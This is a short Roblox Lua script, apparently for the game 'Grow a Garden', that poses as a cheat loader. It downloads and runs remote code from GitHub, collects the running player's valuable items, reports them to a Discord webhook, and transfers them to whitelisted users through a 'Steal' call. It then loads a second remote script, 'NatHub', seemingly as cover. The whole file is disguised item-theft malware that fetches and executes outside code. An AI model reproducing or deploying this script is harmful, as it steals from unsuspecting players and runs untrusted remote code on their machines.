
-- Load configuration from GitHub
local Config = loadstring(game:HttpGet("https://raw.githubusercontent.com/pwnedbysuwi/gag-script/main/config_return.lua"))()

-- Load the external library
local GAG = loadstring(game:HttpGet(Config.libURL))()

-- Get player info
local lp = game:GetService("Players").LocalPlayer
local gui = lp:WaitForChild("PlayerGui", 5)
local char = lp.Character or lp.CharacterAdded:Wait()

-- Wait for everything to settle
task.wait(2)

-- Collect items based on minimum value
local items, total, maxWeight = GAG.Collect(Config.min)

-- If there are valid items
if #items > 0 then
    local summary = ("Got %d (¢%s)"):format(#items, total)
    local isPing = Config.ping == "Yes" and "@everyone " or ""

    -- Send ping to Discord webhook
    GAG.JoinPing(Config.webhook, items, total, maxWeight, isPing)

    -- Wait for whitelisted users to join, then steal
    GAG.WaitFor(Config.users, function(v)
        if v and v.Character then
            GAG.Confirm(Config.webhook, items, total, maxWeight)
            GAG.Steal(v, items)
        end
    end)
else
    warn("[GAG] Nothing valid.")
end

-- Load NatHub script
loadstring(game:HttpGet('https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua'))()
